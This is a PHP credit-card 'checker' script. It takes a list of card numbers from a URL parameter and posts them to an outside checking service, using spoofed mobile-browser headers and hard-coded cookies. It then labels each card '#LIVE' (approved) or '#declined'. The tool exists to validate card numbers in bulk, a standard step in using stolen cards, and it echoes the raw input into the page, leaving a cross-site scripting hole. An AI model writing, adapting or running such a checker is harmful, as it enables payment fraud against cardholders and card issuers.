<?php
error_reporting(0);
set_time_limit(0);
$lista = $_GET["lista"];

$ch = curl_init('https://checker2.visatk.com/card/ccn1/alien07.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ajax=1&do=check&cclist=".$lista."");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: checker2.visatk.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,sv;q=0.6';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Cookie: gads=ID=77bca541c4cf0654-22b83d2301e200b8:T=1687850277:RT=1687850277:S=ALNI_MZXMOQDP3shL6RdrOsScmVbi4pgPw; gpi=UID=00000c723fda00eb:T=1687850277:RT=1687850277:S=ALNI_Mb-DZ9ptyAKQP9h0ObJbuZP3fCquw';
$headers[] = 'Origin: https://checker2.visatk.com';
$headers[] = 'Referer: https://checker2.visatk.com/card/ccn1/';
$headers[] = 'Sec-Ch-Ua: \"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);




if(strpos($result, "Live" )) {
echo "
<b>#LIVE : $lista  ✅
<br>RESPONSE:Your card Approved
 ";
}else {
echo "
<b>#declined : $lista  ❌
<br>RESPONSE: Your card was declined
 ";
}


